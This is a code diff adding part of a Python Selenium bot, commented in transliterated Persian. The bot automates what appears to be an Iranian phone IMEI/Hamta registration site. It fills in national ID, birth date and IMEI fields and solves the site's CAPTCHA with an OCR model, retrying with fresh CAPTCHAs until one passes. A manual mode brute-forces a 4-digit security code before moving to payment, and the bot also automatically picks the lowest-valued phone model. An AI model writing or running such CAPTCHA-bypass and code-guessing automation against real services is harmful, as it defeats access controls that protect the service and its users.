+                    except Exception as _ge:
+                        # timeout/net — baz ham shayad DOM nime-load shode
+                        last_open_err = _ge
+                        print(f">>>   (get exception: {str(_ge).splitlines()[0][:120]})")
+                        try:
+                            driver.execute_script("window.stop();")
+                        except Exception:
+                            pass
+                    try:
+                        WebDriverWait(driver, CAPTCHA_WAIT_SEC).until(
+                            EC.presence_of_element_located(
+                                (By.CSS_SELECTOR, cc.CAPTCHA_CSS)))
+                        opened = True
+                        break
+                    except Exception as _we:
+                        last_open_err = _we
+                        print(f">>>   captcha nayamad — F5 sari' ...")
+                        try:
+                            driver.refresh()
+                        except Exception:
+                            try:
+                                driver.get(cc.URL)
+                            except Exception as _ge2:
+                                last_open_err = _ge2
+                        time.sleep(0.6)
+                except Exception as _oe:
+                    last_open_err = _oe
+                    time.sleep(0.4)
+            if not opened:
+                raise RuntimeError(
+                    f"site baz nashod ba'd az {OPEN_GET_TRIES} get/F5: {last_open_err}")
+            wait = WebDriverWait(driver, CAPTCHA_WAIT_SEC)
+            dbg = DebugController(driver, args.debugging)
+
+            # --- HALAT-e MODIRIAT-e DASTI -----------------------------------------
+            # Rabat FAGHAT safhe-ye avval ra baz mikonad. Karbar khodash ta
+            # securityCodeStep miravad, tik-e taahhod ra mizanad, dokme-ye n0var
+            # ra mizanad -> brute-force + rasid/pardakht. HICH por-kardan-e form
+            # / OCR / marhale 1..4 anjam NEMISHAVAD.
+            if args.manual_manage:
+                print(">>> [manual] safhe baz shod. khodetan ta kod-e 4-raqami "
+                      "boro (tik-e taahhod ra ham bezan).")
+                man = ManualManageController(driver)
+                man.wait_until_user_ready()
+                found = brute_force_security_code(
+                    driver, dbg=None, title=title,
+                    national=national, imei=imei)
+                shot5 = os.path.join(_HERE, "_after_security.png")
+                html5 = os.path.join(_HERE, "_after_security.html")
+                try:
+                    driver.save_screenshot(shot5)
+                    with open(html5, "w", encoding="utf-8") as f:
+                        f.write(driver.page_source)
+                    print(f">>> Ba'd az securityCodeStep -> Screenshot: {shot5} | "
+                          f"HTML: {html5}")
+                except Exception:
+                    pass
+                if found:
+                    print(f">>> ✅ KOD = {found}. handle_receipt_and_payment ...")
+                    try:
+                        handle_receipt_and_payment(
+                            driver, title=title,
+                            national=national, imei=imei)
+                    except Exception as _hpe:
+                        print(f">>> (handle_receipt_and_payment khata: {_hpe})")
+                else:
+                    print(">>> ⚠ kod peyda nashod — panjere baz mimanad ta check koni.")
+                print(">>> Panjere baz mimanad; Enter bezan ta baste shavad.")
+                try:
+                    input()
+                except EOFError:
+                    time.sleep(300)
+                break  # kar tamam — az MAX_TRY biroon
+
+            # SABR ta safhe amade shavad (captcha-ye salem = form-e kamel)
+            print(">>> Sabr baraye captcha-ye salem ...")
+            try:
+                cc.ensure_real_captcha(driver, wait, 0.8)
+            except Exception as _ec:
+                print(f">>> (ensure_real_captcha khata dad: {_ec} — edame ba ensure_page_ready)")
+
+            # QABL az por kardan: motmaen sho safhe KAMEL load shode (dokme-ye 'edame'
+            # VA aks-e captcha hastand). Agar naqes bود -> F5 ta kamel shavad.
+            # te'dad-e reload-ra bالا bordim (site ziyad naqes miayad).
+            if not ensure_page_ready(driver, wait, dbg=dbg, max_reload=8):
+                print(">>> HOSHDAR: safhe ba'd az chand reload ham kamel nashod — "
+                      "talash-e ba'di (restart-e morurgar).")
+                raise RuntimeError("safhe naqes: dokme-ye 'edame'/captcha peyda nashod")
+
+            dbg.step("safhe amade shod — shoru'-e por kardan-e form")
+
+            # 1) AVVAL hame-ye field-ha ra por mikonim (JOZ captcha) va tik ra mizanim.
+            #    (in kar-ha momken ast AJAX-refresh-e Wicket rah biandazand va
+            #     captcha ra AVAZ konand — pas captcha ra ba'dan mikhanim.)
+            dbg.step(f"input: tarikh-e tavallod = {birth}")
+            set_field_js(driver, find(driver, WP_BIRTH), birth)   # datepicker -> JS
+            time.sleep(0.6)
+
+            dbg.step(f"input: kod-e melli = {national}")
+            type_field(driver, find(driver, WP_NATIONAL), national)
+            time.sleep(0.4)
+
+            # IMEI (1 ya 2 — dual-SIM): radif 0 (+ radif 1 ba dokme-ye add).
+            # set_imei_js FAGHAT event-e 'input' mizanad ta radif-e fantom sakhte nashavad.
+            fill_ok = fill_imeis(driver, imeis, dbg=dbg, tries=5)
+            time.sleep(0.4)
+
+            # 2) tik-e "ghabool daram" (momken ast AJAX rah biandazad)
+            if not args.no_confirm_check:
+                dbg.step("click: tik-e 'ghabool daram'")
+                ensure_checked(driver, find(driver, WP_CONFIRM))
+                time.sleep(0.8)
+
+            # 3) ba'd az confirm dobare IMEI-ha ra verify kon (mabada AJAX pak-esh karde).
+            ok_imei, cur_imeis = verify_imeis(driver, imeis)
+            if not ok_imei:
+                dbg.step(f"re-input: IMEI-ha = {imeis} (verify, cur={cur_imeis})")
+                # radif-e kam ra dobare add kon, sepas por
+                fill_imeis(driver, imeis, dbg=None, tries=5)
+                time.sleep(0.6)
+                ok_imei, cur_imeis = verify_imeis(driver, imeis)
+                print(f">>> VERIFY-e IMEI ba'd az re-fill: ok={ok_imei} cur={cur_imeis}")
+            else:
+                print(f">>> VERIFY-e IMEI: ok={ok_imei} cur={cur_imeis}")
+
+            # 3.5) radif-e khali-ye EZAFE (fantom) ra hazf kon — radif-haye por-e
+            #      dual-SIM ra dast nazan. keep = tedad-e IMEI-haye ma'mour.
+            cleanup_extra_empty_imei_rows(driver, keep=len(imeis), dbg=dbg)
+
+            # 4) AKHARIN kar: captcha ra mikhanim va migozarim.
+            #    MOHEM: dar halat-e DEBUG, mekas-haye marhale-haye ghabli momken ast
+            #    daghayegh tul bekeshad va captcha-ye ruye safhe MONGHAZI shavad ->
+            #    submit bi-seda jelo nemiravad ("dokme kar nakard"). Pas:
+            #      a) INJA MEKAS NEMIKONIM (notify, na step).
+            #      b) DORost GHABL az khandan, captcha ra REFRESH mikonim ta yek
+            #         captcha-ye NOW-e taze begirim (refreshCapcha AJAX GET ast va
+            #         field-haye por-shode ra POST/pak nemikonad), sepas FOWRI submit.
+            dbg.notify("read + input: captcha (refresh -> khandan -> submit-e fowri)")
+            captcha = driver.find_element(By.CSS_SELECTOR, cc.CAPTCHA_CSS)
+            try:
+                changed = cc.click_refresh(driver, wait, captcha)
+                print(f">>> captcha refresh shod (taze) -> avaz shod: {changed}")
+                # ba'd az refresh element momken ast now shavad -> dobare peyda kon
+                captcha = driver.find_element(By.CSS_SELECTOR, cc.CAPTCHA_CSS)
+            except Exception as _re:
+                print(f">>> (refresh-e captcha na-shod, ba hamin captcha edame: {_re})")
+            cc.prepare_captcha_for_shot(driver, captcha)
+            crop = cc.crop_captcha_with_padding(driver, captcha)
+            answer = solver.read_pil(crop)
+            cap_ok = type_and_verify(driver, WP_CAPTCHA, answer)
+            if not cap_ok:
+                print(">>> KHATA: captcha dar field neshaste NASHOD (bad az chand talash).")
+            # ZAKHIRE-ye axe-e daghigh-e captcha ke model khand -> baraye moghayese
+            # ba cheshm (agar submit shekast khord, mifahmim model khata dad ya
+            # site captcha ra avaz karde).
+            shot_path = os.path.join(_HERE, f"_last_captcha_{answer}.png")
+            try:
+                crop.save(shot_path)
+                print(f">>> Axe-e captcha zakhire shod: {shot_path}")
+            except Exception as _e:
+                print(f">>> (zakhire-ye axe captcha na-shod: {_e})")
+            print(f">>> Javab-e captcha (model, ba'd az por kardan-e baghiye): {answer!r}")
+
+            # 5) VERIFY-e nahayi: dobare hame-ye meghdar-ha ra chap kon
+            def val(wp):
+                try:
+                    return (find(driver, wp).get_attribute("value") or "").strip()
+                except Exception:
+                    return "?"
+            imei_vals = [(r.get_attribute("value") or "").strip() for r in imei_rows(driver)]
+            print(f">>> VERIFY -> melli={val(WP_NATIONAL)!r} birth={val(WP_BIRTH)!r} "
+                  f"imei_rows={imei_vals} captcha={val(WP_CAPTCHA)!r}")
+
+            print("\n>>> Form por shod. javab-e captcha =", repr(answer))
+
+            if not args.submit:
+                print(">>> Dokme-ye 'edame' ZADE NASHOD (--submit dade nashode).")
+                print(">>> Panjere baz mimanad; Enter bezan ta baste shavad.")
+                try:
+                    input()
+                except EOFError:
+                    time.sleep(300)
+                break
+
+            # --- SUBMIT: FOWRI dokme-ye 'edame' ra mizanim ta captcha monghazi nashavad ---
+            # DAR HALAT-e DEBUG HAM MEKAS NEMIKONIM (notify, na step) — mekas =
+            # engheza-ye captcha. Faghat n0var ra be-ruz mikonim va FOWRI click.
+            dbg.notify("click: dokme-ye 'edame' (SUBMIT) — khodkar, bedun-e mekas")
+            print(">>> Zadan-e dokme-ye 'edame' (FOWRI, ta captcha taze bemanad) ...")
+
+            def _page_advanced():
+                """True agar az imeiStep radd shodim: ya hamtaStep amad, ya
+                feedback-e khata neshast (yani click be server resid).
+
+                MOHEM: payam-e khata-ye captcha ('کد امنیتی صحیح نمی باشد') dar
+                'feedBack_container_error' mineshinad (na hatman .feedbackPanelERROR).
+                Pas HAR DO ja-ra check mikonim ta khata FOWRI tashkhis dade shavad
+                (na inke 3 bar click konim va 20s montazer bemAnim)."""
+                return driver.execute_script(r"""
+                    if (document.querySelector('[wicketpath="%s"]')) return true;
+                    var sels = [
+                      '[wicketpath$="feedBack_container_error"] li',
+                      '[wicketpath$="feedBack_container_error"] span[wicketpath$="_message"]',
+                      '.feedbackPanelERROR'
+                    ];
+                    for (var s=0;s<sels.length;s++){
+                      var fb = document.querySelectorAll(sels[s]);
+                      for (var i=0;i<fb.length;i++){
+                        if ((fb[i].innerText||'').trim()) return true;
+                      }
+                    }
+                    return false;
+                """ % WP_HAMTA_CONTINUE)
+
+            # AJAX-e Wicket loader/indicator darad va dokme ra حین request disabled
+            # mikonad (bsh/coh dar khod-e safhe). Pas WAGHTI loader michkarkhad ya
+            # dokme disabled ast => SABR mikonim, click-e dobare NAMIZANIM (chون
+            # request dobare/kharab-shodan-e captcha khatarnak ast). faghat agar
+            # dokme BIKAR va FA'AL mand va safhe jelo naraft => click-e dobare.
+            def _ajax_busy():
+                return driver.execute_script(r"""
+                    var wp = arguments[0];
+                    var btn = document.querySelector('[wicketpath="'+wp+'"]');
+                    if (btn && (btn.disabled ||
+                        (' '+(btn.className||'')+' ').indexOf(' disabled ')>=0))
+                        return true;
+                    var ind = document.querySelectorAll(
+                        '.wicket-ajax-indicator,'+
+                        '[wicketpath="form_indicator_indicatorImg"]');
+                    for (var j=0;j<ind.length;j++){
+                        if (ind[j].offsetParent !== null) return true; // namayan
+                    }
+                    return false;
+                """, WP_CONTINUE)
+
+            def _do_click():
+                btn = find(driver, WP_CONTINUE)  # dobare peyda kon (id avaz mishavad)
+                driver.execute_script(
+                    "arguments[0].scrollIntoView({block:'center'});", btn)
+                # MOHEM: dar halat-e mobile-emulation, .click()-e Selenium/JS roo-ye
+                # dokme-ye Wicket kar NEMIKONAD (site be touch/pointer goosh midahad).
+                # Pas zanjire-ye kamel-e touch+pointer+mouse ra dispatch mikonim
+                # (hamun ravesh ke baraye refresh-e captcha javab dad).
+                cc.fire_refresh_events(driver, btn)
+
+            clicked_ok = False
+            did_click = 0
+            # site gahi loader-ra 30-40s negah midarad — zood tavaghof nakon
+            deadline = time.time() + 45
+            try:
+                _do_click()
+                did_click += 1
+                print(">>> click-e 'edame' ferestade shod — montazer-e vakonesh-e AJAX (loader) ...")
+            except Exception as _ce:
+                print(f">>> khata dar click-e avval: {_ce}")
+
+            idle_since = None
+            while time.time() < deadline:
+                time.sleep(0.35)
+                # 1) safhe raft jelo? (hamtaStep amad ya feedback-e khata neshast
+                #    ya dokme-ye imeiStep dige nist)
+                try:
+                    if _page_advanced() or not driver.find_elements(
+                            By.CSS_SELECTOR, f'[wicketpath="{WP_CONTINUE}"]'):
+                        clicked_ok = True
+                        break
+                except Exception:
+                    pass
+                # 2) AJAX dar jaryan (loader michkarkhad / dokme disabled) -> SABR kon
+                try:
+                    busy = _ajax_busy()
+                except Exception:
+                    busy = False
+                if busy:
+                    idle_since = None
+                    continue
+                # 3) bikar va fa'al ast vali hanuz naraft -> shayad click nakhord.
+                #    yek forsat-e kutah bede, ba'd faghat DAR IN halat dobare click kon.
+                if idle_since is None:
+                    idle_since = time.time()
+                elif time.time() - idle_since > 2.0 and did_click < 3:
+                    print(f">>> vakonesh nadad va AJAX ham dar jaryan nist -> "
+                          f"click-e dobare ({did_click + 1})")
+                    try:
+                        _do_click()
+                        did_click += 1
+                    except Exception as _ce:
+                        print(f">>> khata dar click-e dobare: {_ce}")
+                    idle_since = None
+
+            print(f">>> dokme-ye 'edame' zade shod (javab-dade): {clicked_ok} "
+                  f"(tedad-e click: {did_click})")
+            if not clicked_ok:
+                print(">>> HOSHDAR: dokme click shod vali safhe jelo naraft "
+                      "(loader tulani / bi-pasokh). payam-ha ra check + retry.")
+
+            # sabr-e kutah ta DOM-e safhe-ye jadid ja bishinad
+            time.sleep(1.2)
+
+            # --- TASHKHIS-e khata / movaffaghiat ---
+            # payam-ha-ye ERROR-ra faghat az 'feedBack_container_error' (ja-ye
+            # daghigh) migirim ta ba payam-haye info/success ghati nashavad.
+            def _read_imei_errors():
+                try:
+                    return driver.execute_script(r"""
+                        const els = document.querySelectorAll(
+                          '[wicketpath$="feedBack_container_error"] li, '+
+                          '[wicketpath$="feedBack_container_error"] span[wicketpath$="_message"], '+
+                          '.feedbackPanelERROR li, .feedbackPanelERROR');
+                        const msgs=[];
+                        els.forEach(e=>{const t=(e.innerText||'').trim();
+                          if(t && msgs.indexOf(t)<0) msgs.push(t);});
+                        return msgs;
+                    """) or []
+                except Exception:
+                    return []
+
+            err = _read_imei_errors()
+            # agar hanooz loader/busy bud va error nist, yek forsat-e ezafe bede
+            # (site gahi error/hamta ra dیر midahad)
+            if not err and not driver.find_elements(
+                    By.CSS_SELECTOR, f'[wicketpath="{WP_HAMTA_CONTINUE}"]'):
+                extra_dl = time.time() + 15
+                print(">>> montazer-e pasokh-e ezafe (site kond) ta 15s ...")
+                while time.time() < extra_dl:
+                    time.sleep(0.5)
+                    try:
+                        if driver.find_elements(
+                                By.CSS_SELECTOR, f'[wicketpath="{WP_HAMTA_CONTINUE}"]'):
+                            clicked_ok = True
+                            break
+                    except Exception:
+                        pass
+                    err = _read_imei_errors()
+                    if err:
+                        break
+                    try:
+                        if _ajax_busy():
+                            continue
+                    except Exception:
+                        pass
+
+            # khata-ye captcha: FAGHAT payam-e roshan-e captcha/kod-e amniati.
+            # Ghablan 'اعتبار'/'امنیت' kheyli broad bood va ba 'Invalid timestamp'
+            # / payam-haye digar eshtebahi captcha shenasayi mishod.
+            captcha_err = any((
+                "کد امنیتی صحیح" in m or "امنیتی صحیح" in m or
+                "کد اعتبار سنجی" in m or "اعتبار سنجی صحیح" in m or
+                ("captcha" in m.lower() and "incorrect" in m.lower()))
+                for m in (err or []))
+
+            if err:
+                print(">>> PAYAM-HA-YE SITE:")
+                for m in err:
+                    # farsi ra be console-e cp1252 nafrest (khata mide) -> repr-e ascii-safe
+                    print("     -", m.encode("unicode_escape").decode("ascii"))
+
+            if captcha_err:
+                print(">>> Khata-ye CAPTCHA (monghazi/eshtebah). Talash-e dobare ba captcha-ye no ...")
+                # bad az bastan, halghe dobare az avval site ra baz mikonad
+                try:
+                    driver.quit()
+                except Exception:
+                    pass
+                driver = None
+                time.sleep(1.0)
+                continue  # talash-e ba'di
+
+            # HAR KHATA-ye DIGAR (JOZ captcha) roo-ye SAFHE-ye AVVAL (imeiStep):
+            #   - fatal -> stop
+            #   - transient (Invalid timestamp / signature / ...) -> warn + restart sari'
+            #   - digar -> log + restart
+            still_imei = bool(driver.find_elements(
+                By.CSS_SELECTOR, f'[wicketpath="{WP_CONTINUE}"]'))
+            no_hamta = not driver.find_elements(
+                By.CSS_SELECTOR, f'[wicketpath="{WP_HAMTA_CONTINUE}"]')
+            if err and still_imei and no_hamta:
+                err_text = " | ".join(err)
+                fatal = any(mk in err_text for mk in IMEI_FATAL_MARKERS)
+                transient = (not fatal) and any(
+                    mk.lower() in err_text.lower() if mk.isascii()
+                    else mk in err_text
+                    for mk in IMEI_TRANSIENT_MARKERS)
+                if fatal:
+                    log_event("error",
+                              f"khata-ye KOSHANDE dar imeiStep (edame momken nist): {err_text}",
+                              step="marhale-1/imeiStep",
+                              title=title, national=national, imei=imei)
+                    print(">>> ⛔ KHATA-ye KOSHANDE roo-ye safhe-ye avval — edame MOMKEN "
+                          "NIST (retry fayde nadarad). ROBOT motevaghef mishavad:")
+                    print("     " + err_text.encode("unicode_escape").decode("ascii"))
+                    try:
+                        driver.quit()
+                    except Exception:
+                        pass
+                    driver = None
+                    return  # khoruj-e kamel az main (na break-e halghe -> na retry)
+                if transient:
+                    log_event("warn",
+                              f"khata-ye movaghat imeiStep (retry): {err_text}",
+                              step="marhale-1/imeiStep",
+                              title=title, national=national, imei=imei)
+                    print(">>> ⚠ khata-ye MOVAGHAT imeiStep (mesl Invalid timestamp) — "
+                          "retry-e sari' ba captcha-ye taze:")
+                    print("     " + err_text.encode("unicode_escape").decode("ascii"))
+                else:
+                    log_event("error", f"khata-ye gheyr-captcha dar imeiStep: {err_text}",
+                              step="marhale-1/imeiStep",
+                              title=title, national=national, imei=imei)
+                    print(">>> KHATA-ye gheyr-captcha roo-ye safhe-ye avval (dar log "
+                          "zakhire shod) — DARJA talash-e dobare:")
+                    print("     " + err_text.encode("unicode_escape").decode("ascii"))
+                try:
+                    driver.quit()
+                except Exception:
+                    pass
+                driver = None
+                time.sleep(0.8 if transient else 1.5)
+                continue  # talash-e ba'di (restart -> captcha-ye taze)
+
+            # agar click javab nadad va hamta/error nist -> transient-e bi-payam
+            if (still_imei and no_hamta and not err and not clicked_ok):
+                log_event("warn",
+                          "imeiStep: ba'd az click hich pasokhi nayamad (loader/timeout) — retry",
+                          step="marhale-1/imeiStep",
+                          title=title, national=national, imei=imei)
+                print(">>> ⚠ imeiStep bi-pasokh — restart-e sari' va talash-e dobare ...")
+                try:
+                    driver.quit()
+                except Exception:
+                    pass
+                driver = None
+                time.sleep(0.8)
+                continue
+
+            # agar khata-ye captcha nabood -> ehtemalan raftim safhe-ye ba'd (ya khata-ye digar)
+            page_shot = os.path.join(_HERE, "_after_submit.png")
+            try:
+                driver.save_screenshot(page_shot)
+            except Exception:
+                pass
+            html_path = os.path.join(_HERE, "_after_submit.html")
+            try:
+                with open(html_path, "w", encoding="utf-8") as f:
+                    f.write(driver.page_source)
+            except Exception:
+                pass
+            cur_url = driver.current_url
+            print(f">>> Ba'd az submit: URL={cur_url}")
+            print(f">>> Screenshot: {page_shot}")
+            print(f">>> HTML-e safhe: {html_path}")
+
+            # --- MARHALE-ye 2: safhe-ye hamtaStep (etela'at-e gushi + dokme-ye edame) ---
+            hamta_btns = driver.find_elements(
+                By.CSS_SELECTOR, f'[wicketpath="{WP_HAMTA_CONTINUE}"]')
+            if hamta_btns:
+                # matn-e etela'at-e gushi ra be karbar neshan bede
+                try:
+                    info = driver.find_element(
+                        By.CSS_SELECTOR, f'[wicketpath="{WP_HAMTA_INFO}"]').text.strip()
+                except Exception:
+                    info = ""
+                if info:
+                    print(">>> Etela'at-e HAMTA:")
+                    print("     " + info.encode("unicode_escape").decode("ascii"))
+
+                # in yek noghte-ye TASMIM ast: site hoshdar midahad agar etela'at ba
+                # gushi motabeghat nadarad 'edame' nazan. Pas dar halat-e debug INJA
+                # MEKAS mikonim (step) — engheza-ye captcha inja nist, safhe amade ast.
+                dbg.step("click: dokme-ye 'edame'-ye HAMTA (marhale-ye 2) — "
+                         "etela'at-e gushi ra check kon")
+                print(">>> Zadan-e dokme-ye 'edame'-ye hamtaStep ...")
+
+                # signature-e safhe-ye fe'li (matn-e hamtaInfo) — baraye tashkhis-e
+                # taghyir-e safhe ba'd az click.
+                def _hamta_gone():
+                    """True agar az hamtaStep radd shodim: dokme-ye edame-ye hamta
+                    dige nist, YA feedback-e khata neshast."""
+                    return driver.execute_script(r"""
+                        if (!document.querySelector('[wicketpath="%s"]')) return true;
+                        var fb = document.querySelectorAll('.feedbackPanelERROR');
+                        for (var i=0;i<fb.length;i++){
+                          if ((fb[i].innerText||'').trim()) return true;
+                        }
+                        return false;
+                    """ % WP_HAMTA_CONTINUE)
+
+                # SABR ta loader michkarkhad / dokme disabled -> click-e dobare nazan.
+                def _hamta_busy():
+                    return driver.execute_script(r"""
+                        var wp = arguments[0];
+                        var btn = document.querySelector('[wicketpath="'+wp+'"]');
+                        if (btn && (btn.disabled ||
+                            (' '+(btn.className||'')+' ').indexOf(' disabled ')>=0))
+                            return true;
+                        var ind = document.querySelectorAll(
+                            '.wicket-ajax-indicator,'+
+                            '[wicketpath="form_indicator_indicatorImg"]');
+                        for (var j=0;j<ind.length;j++){
+                            if (ind[j].offsetParent !== null) return true;
+                        }
+                        return false;
+                    """, WP_HAMTA_CONTINUE)
+
+                def _do_hamta_click():
+                    hbtn = find(driver, WP_HAMTA_CONTINUE)  # dobare peyda kon
+                    driver.execute_script(
+                        "arguments[0].scrollIntoView({block:'center'});", hbtn)
+                    # hamun ravesh-e touch/pointer/mouse (click-e sade kar nemikonad)
+                    cc.fire_refresh_events(driver, hbtn)
+
+                hclick_ok = False
+                hdid_click = 0
+                hdeadline = time.time() + 20
+                try:
+                    _do_hamta_click()
+                    hdid_click += 1
+                    print(">>> click-e 'edame'-ye hamta ferestade shod — montazer-e loader ...")
+                except Exception as _hce:
+                    print(f">>> khata dar click-e avval-e hamta: {_hce}")
+
+                hidle_since = None
+                while time.time() < hdeadline:
+                    time.sleep(0.3)
+                    try:
+                        if _hamta_gone():
+                            hclick_ok = True
+                            break
+                    except Exception:
+                        pass
+                    try:
+                        hbusy = _hamta_busy()
+                    except Exception:
+                        hbusy = False
+                    if hbusy:
+                        hidle_since = None
+                        continue
+                    if hidle_since is None:
+                        hidle_since = time.time()
+                    elif time.time() - hidle_since > 1.2 and hdid_click < 3:
+                        print(f">>> hamta vakonesh nadad va AJAX bikar ast -> "
+                              f"click-e dobare ({hdid_click + 1})")
+                        try:
+                            _do_hamta_click()
+                            hdid_click += 1
+                        except Exception as _hce:
+                            print(f">>> khata dar click-e dobare-ye hamta: {_hce}")
+                        hidle_since = None
+
+                print(f">>> dokme-ye 'edame'-ye hamta zade shod (javab-dade): {hclick_ok} "
+                      f"(tedad-e click: {hdid_click})")
+                if not hclick_ok:
+                    print(">>> HOSHDAR: dokme-ye hamta click shod vali safhe jelo naraft.")
+                time.sleep(1.5)
+
+                # natije ra zakhire kon baraye barresi
+                shot2 = os.path.join(_HERE, "_after_hamta.png")
+                html2 = os.path.join(_HERE, "_after_hamta.html")
+                try:
+                    driver.save_screenshot(shot2)
+                    with open(html2, "w", encoding="utf-8") as f:
+                        f.write(driver.page_source)
+                    print(f">>> Ba'd az hamta -> Screenshot: {shot2} | HTML: {html2}")
+                except Exception:
+                    pass
+                print(f">>> URL-e fe'li: {driver.current_url}")
+
+                # --- MARHALE-ye 3: tscStep — entekhab-e ARZAN-TARIN model az dropdown ---
+                # dropdown-e "model-e daghigh-e gushi" (tscChoice). har option matn-e
+                #   "... ارزش: 383.00000 دلار آمريکا" darad. arzesh-e dolari ra darmiavarim
+                #   va KAMTARIN ra entekhab mikonim (agar chand-ta barabar bud, AVVALI).
+                # sabr ta select-e tscStep biayad (ba'd az edame-ye hamta, AJAX-i)
+                choice_opts = None
+                for _ in range(30):  # ta ~9s
+                    choice_opts = driver.execute_script(r"""
+                        var sel = document.querySelector('[wicketpath="%s"]');
+                        if(!sel) return null;
+                        return Array.from(sel.options).map(function(o){
+                            return {value:o.value, text:(o.text||'').trim()};
+                        });
+                    """ % WP_TSC_CHOICE)
+                    if choice_opts:
+                        break
+                    time.sleep(0.3)
+
+                if not choice_opts:
+                    print(">>> (safhe-ye tscStep/dropdown-e model peyda nashod — "
+                          "HTML/screenshot-e _after_hamta ra check kon.)")
+                else:
+                    # arzesh-e dolari-ra az matn darbiavar: 'ارزش: 383.00000 دلار'
+                    price_re = re.compile(r"ارزش\s*:\s*([\d.,]+)")
+                    parsed = []
+                    for o in choice_opts:
+                        v = (o.get("value") or "").strip()
+                        t = o.get("text") or ""
+                        if not v:  # 'انتخاب کنید'
+                            continue
+                        m = price_re.search(t)
+                        price = None
+                        if m:
+                            raw = m.group(1).replace(",", "")
+                            try:
+                                price = float(raw)
+                            except ValueError:
+                                price = None
+                        parsed.append({"value": v, "text": t, "price": price})
+
+                    priced = [p for p in parsed if p["price"] is not None]
+                    print(f">>> tscStep: {len(parsed)} model, "
+                          f"{len(priced)} ba qeymat-e khanda-shode.")
+                    for p in parsed:
+                        pr = f"{p['price']:.2f}$" if p["price"] is not None else "??"
+                        print(f"      [{pr:>10}] "
+                              f"{p['text'].encode('unicode_escape').decode('ascii')}")
+
+                    if not priced:
+                        print(">>> HOSHDAR: hich qeymat-i khanda nashod — "
+                              "entekhab-e khodkar anjam nemishavad. dasti entekhab kon.")
+                    else:
+                        # kamtarin qeymat; agar barabar, AVVALI (min paydari-ye tartib)
+                        min_price = min(p["price"] for p in priced)
+                        chosen = next(p for p in priced if p["price"] == min_price)
+                        print(f">>> ARZAN-TARIN: {min_price:.2f}$ -> value={chosen['value']}")
+                        print("      " +
+                              chosen["text"].encode("unicode_escape").decode("ascii"))
+
+                        # entekhab: value-ye select ra migozarim + event-ha ra shellik
+                        # mikonim (Wicket be change goosh midahad). widget-e zibaie
+                        # (selectpicker/chosen) ra ham refresh mikonim agar bud.
+                        set_ok = driver.execute_script(r"""
+                            var wp = arguments[0], val = arguments[1];
+                            var sel = document.querySelector('[wicketpath="'+wp+'"]');
+                            if(!sel) return false;
+                            sel.value = val;
+                            sel.dispatchEvent(new Event('input',{bubbles:true}));
+                            sel.dispatchEvent(new Event('change',{bubbles:true}));
+                            try { if(window.jQuery){
+                                var $s=jQuery(sel);
+                                if($s.data('selectpicker')) $s.selectpicker('refresh');
+                                $s.trigger('change'); $s.trigger('chosen:updated');
+                            }} catch(e){}
+                            return sel.value === val;
+                        """, WP_TSC_CHOICE, chosen["value"])
+
+                        # sabr ta AJAX-e ehtemali-ye onchange tamam shavad (loader)
+                        for _ in range(20):
+                            time.sleep(0.2)
+                            busy = driver.execute_script(r"""
+                                var ind = document.querySelectorAll(
+                                  '.wicket-ajax-indicator,'+
+                                  '[wicketpath$="_indicator_indicatorImg"]');
+                                for(var j=0;j<ind.length;j++){
+                                  if(ind[j].offsetParent!==null) return true;
+                                }
+                                return false;
+                            """)
+                            if not busy:
+                                break
+
+                        # VERIFY: value-ye fe'li-ye select
+                        cur = driver.execute_script(r"""
+                            var sel = document.querySelector('[wicketpath="%s"]');
+                            if(!sel) return null;
+                            var o = sel.options[sel.selectedIndex];
+                            return {value: sel.value, text: o?(o.text||'').trim():''};
+                        """ % WP_TSC_CHOICE)
+                        ok_sel = bool(cur and cur.get("value") == chosen["value"])
+                        print(f">>> VERIFY-e entekhab: neshast={set_ok} | "
+                              f"value-ye fe'li={cur.get('value') if cur else None} | "
+                              f"dorost={ok_sel}")
+                        if cur and cur.get("text"):
+                            print("      " +
+                                  cur["text"].encode("unicode_escape").decode("ascii"))
+
+                        if not ok_sel:
+                            print(">>> HOSHDAR: entekhab dar select nanshast — "
+                                  "dokme-ye edame zade NEMISHAVAD. dasti check kon.")
+                        else:
+                            # dokme-ye 'edame'-ye tscStep — hamun ravesh-e touch/pointer
+                            dbg.step("click: 'edame'-ye tscStep — model-e arzan entekhab "
+                                     "shod, check kon va boro marhale-ye ba'd")
+
+                            def _tsc_gone():
+                                return driver.execute_script(r"""
+                                    if(!document.querySelector('[wicketpath="%s"]')) return true;
+                                    var fb=document.querySelectorAll('.feedbackPanelERROR');
+                                    for(var i=0;i<fb.length;i++){
+                                      if((fb[i].innerText||'').trim()) return true;
+                                    }
+                                    return false;
+                                """ % WP_TSC_CONTINUE)
+
+                            def _tsc_busy():
+                                return driver.execute_script(r"""
+                                    var wp=arguments[0];
+                                    var b=document.querySelector('[wicketpath="'+wp+'"]');
+                                    if(b && (b.disabled ||
+                                        (' '+(b.className||'')+' ').indexOf(' disabled ')>=0))
+                                        return true;
+                                    var ind=document.querySelectorAll(
+                                      '.wicket-ajax-indicator,'+
+                                      '[wicketpath$="_indicator_indicatorImg"]');
+                                    for(var j=0;j<ind.length;j++){
+                                      if(ind[j].offsetParent!==null) return true;
+                                    }
+                                    return false;
+                                """, WP_TSC_CONTINUE)
+
+                            def _do_tsc_click():
+                                tbtn = find(driver, WP_TSC_CONTINUE)
+                                driver.execute_script(
+                                    "arguments[0].scrollIntoView({block:'center'});", tbtn)
+                                cc.fire_refresh_events(driver, tbtn)
+
+                            tclick_ok = False
+                            tdid_click = 0
+                            tdeadline = time.time() + 20
+                            try:
+                                _do_tsc_click()
+                                tdid_click += 1
+                                print(">>> click-e 'edame'-ye tscStep ferestade shod ...")
+                            except Exception as _tce:
+                                print(f">>> khata dar click-e avval-e tscStep: {_tce}")
+                            tidle_since = None
+                            while time.time() < tdeadline:
+                                time.sleep(0.3)
+                                try:
+                                    if _tsc_gone():
+                                        tclick_ok = True
+                                        break
+                                except Exception:
+                                    pass
+                                try:
+                                    tbusy = _tsc_busy()
+                                except Exception:
+                                    tbusy = False
+                                if tbusy:
+                                    tidle_since = None
+                                    continue
+                                if tidle_since is None:
+                                    tidle_since = time.time()
+                                elif time.time() - tidle_since > 1.2 and tdid_click < 3:
+                                    print(f">>> tscStep vakonesh nadad -> click-e dobare "
+                                          f"({tdid_click + 1})")
+                                    try:
+                                        _do_tsc_click()
+                                        tdid_click += 1
+                                    except Exception as _tce:
+                                        print(f">>> khata click-e dobare-ye tscStep: {_tce}")
+                                    tidle_since = None
+
+                            print(f">>> dokme-ye 'edame'-ye tscStep zade shod: {tclick_ok} "
+                                  f"(tedad-e click: {tdid_click})")
+                            if not tclick_ok:
